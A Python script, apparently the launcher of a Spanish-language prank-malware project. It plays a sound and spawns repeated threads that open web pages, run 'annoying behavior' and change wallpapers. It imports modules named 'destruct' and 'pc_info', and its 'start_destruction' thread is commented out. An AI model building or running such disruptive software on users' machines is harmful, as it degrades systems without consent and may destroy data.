from threading import Thread
from playsound import playsound

# Importa los módulos desde src
try:
     from src.behavior import * 
     from src.destruct import *
     from src.pc_info import *
     from src.wallpaper import *
except ModuleNotFoundError:
     print("Ejecuta el script desde la carpeta linux, por favor")

def play():
     playsound('src/amogus.mp3')

     
threads = []
among_thread = Thread(target=play)
among_thread.start()
for _ in range(10):
     t1 = Thread(target=webOpen)
     t1.start()
     t2 = Thread(target=annoying_behavior)
     t2.start()
     t3 = Thread(target=set_wallpapers)
     t3.start()
#    t4 = Thread(target=start_destruction)
#    t4.start()
     threads.append(t1)
     threads.append(t2)
     threads.append(t3)
#    threads.append(t4)
for thread in threads:
     thread.join()
among_thread.join()
